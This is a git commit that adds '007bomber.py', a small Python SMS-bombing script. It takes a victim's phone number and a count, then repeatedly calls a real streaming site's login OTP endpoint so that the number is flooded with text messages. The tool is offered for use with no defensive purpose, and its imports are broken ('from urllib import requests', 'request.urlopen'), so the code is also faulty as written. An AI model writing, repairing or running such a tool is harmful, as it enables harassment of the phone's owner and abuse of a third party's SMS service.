cded917e93502794e0affff208569428ab4481ad
mad420-max <78628376+mad420-max@users.noreply.github.com>
2022-01-19 15:00:18 +0600

    Create 007bomber.py

---
+++ 007bomber.py
@@ -0,0 +1,14 @@
+import os
+import time
+from urllib import requests
+
+
+phone  = input("phone number: ")
+sms = int(input("amount: "))
+
+url ="https://www.bioscopelive.com/bn/login/send-otp?phone=88"+phone+"&operator=bd-otp"
+
+for a in range(sms):
+	request.urlopen(url)
+	print(str(a+1)+ "sms send ")
+	time.sleep(30)
